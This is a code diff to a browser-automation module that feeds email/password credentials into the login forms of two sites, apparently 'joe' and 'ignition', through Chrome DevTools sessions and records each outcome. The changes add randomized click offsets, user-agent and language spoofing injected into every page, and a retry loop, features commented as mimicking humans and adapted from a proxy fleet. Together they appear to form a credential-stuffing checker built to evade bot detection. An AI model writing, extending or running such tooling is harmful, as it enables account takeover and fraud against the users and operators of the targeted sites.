@@ -8,6 +8,7 @@
  * this without any extra backend.
  */
 import { JOE_IGNITE_CONFIG, jitter, classifyOutcome } from '@/lib/joeIgniteConfig';
+import { AU_MOBILE_INIT_SCRIPT } from '@/lib/auMobilePreset';
 
 class CDPClient {
   constructor(ws) {
@@ -110,7 +111,29 @@ async function dismissCookieBanner(cdp, sessionId) {
   await jitter(300, 600);
 }
 
-async function fillAndSubmit(cdp, sessionId, selectors, email, password, overwrite) {
+/**
+ * Click an element with an optional small pixel offset from its center.
+ * Used on retry attempts to add human-like variance to the click target.
+ */
+async function clickWithJitter(cdp, sessionId, selector, offsetPx = 0) {
+  const expr = `(() => {
+    const el = document.querySelector(${JSON.stringify(selector)});
+    if (!el) return false;
+    const rect = el.getBoundingClientRect();
+    const ox = ${offsetPx} ? (Math.random() * ${offsetPx} * 2 - ${offsetPx}) : 0;
+    const oy = ${offsetPx} ? (Math.random() * ${offsetPx} * 2 - ${offsetPx}) : 0;
+    const x = rect.left + rect.width / 2 + ox;
+    const y = rect.top + rect.height / 2 + oy;
+    const opts = { bubbles: true, clientX: x, clientY: y };
+    el.dispatchEvent(new MouseEvent('mousedown', opts));
+    el.dispatchEvent(new MouseEvent('mouseup', opts));
+    el.dispatchEvent(new MouseEvent('click', opts));
+    return true;
+  })()`;
+  return evaluate(cdp, sessionId, expr);
+}
+
+async function fillAndSubmit(cdp, sessionId, selectors, email, password, overwrite, clickOffsetPx = 0) {
   const expr = `(() => {
     const setVal = (sel, val) => {
       const el = document.querySelector(sel);
@@ -130,13 +153,17 @@ async function fillAndSubmit(cdp, sessionId, selectors, email, password, overwri
   await evaluate(cdp, sessionId, expr);
   await jitter(60, 140);
 
-  const submitExpr = `(() => {
-    const btn = document.querySelector(${JSON.stringify(selectors.submit)});
-    if (!btn) return false;
-    btn.click();
-    return true;
-  })()`;
-  await evaluate(cdp, sessionId, submitExpr);
+  if (clickOffsetPx > 0) {
+    await clickWithJitter(cdp, sessionId, selectors.submit, clickOffsetPx);
+  } else {
+    const submitExpr = `(() => {
+      const btn = document.querySelector(${JSON.stringify(selectors.submit)});
+      if (!btn) return false;
+      btn.click();
+      return true;
+    })()`;
+    await evaluate(cdp, sessionId, submitExpr);
+  }
 }
 
 async function readPageState(cdp, sessionId) {
@@ -178,7 +205,7 @@ async function waitForResponse(cdp, sessionId, attempt) {
  * Run a single credential through one BB session with two tabs.
  * onProgress({ attempt, phase, joe, ignition }) called on each step.
  */
-export async function runCredentialInSession({ connectUrl, email, password, onProgress }) {
+export async function runCredentialInSession({ connectUrl, email, password, onProgress, auMobile = false }) {
   const cdp = await openCDP(connectUrl);
   const results = { joe: null, ignition: null };
   let attemptNum = 0;
@@ -189,6 +216,16 @@ export async function runCredentialInSession({ connectUrl, email, password, onPr
     const { targetId: ignTargetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
     const joeSession = await attachToTarget(cdp, joeTargetId);
     const ignSession = await attachToTarget(cdp, ignTargetId);
+
+    // AU mobile: inject UA/language override into every new document
+    if (auMobile) {
+      for (const s of [joeSession, ignSession]) {
+        await cdp.send('Page.enable', {}, s);
+        await cdp.send('Page.addScriptToEvaluateOnNewDocument', { source: AU_MOBILE_INIT_SCRIPT }, s);
+        await cdp.send('Network.enable', {}, s);
+        await cdp.send('Network.setExtraHTTPHeaders', { headers: { 'Accept-Language': 'en-AU,en-GB;q=0.9,en;q=0.8' } }, s);
+      }
+    }
 
     const sites = [
       { key: 'joe',      session: joeSession, cfg: JOE_IGNITE_CONFIG.SITES.joe },
@@ -202,7 +239,9 @@ export async function runCredentialInSession({ connectUrl, email, password, onPr
           await dismissCookieBanner(cdp, site.session);
           await jitter(300, 600);
         }
-        await fillAndSubmit(cdp, site.session, site.cfg.selectors, email, password, attempt > 1);
+        // Click jitter on retries: small pixel offset from button center (adapted from au-proxy-fleet)
+        const clickOffsetPx = attempt > 1 ? 3 : 0;
+        await fillAndSubmit(cdp, site.session, site.cfg.selectors, email, password, attempt > 1, clickOffsetPx);
         // Returns as soon as DOM has a definitive response; cap = 7s on first press, 3s on retries
         const { outcome } = await waitForResponse(cdp, site.session, attempt);
         return outcome;
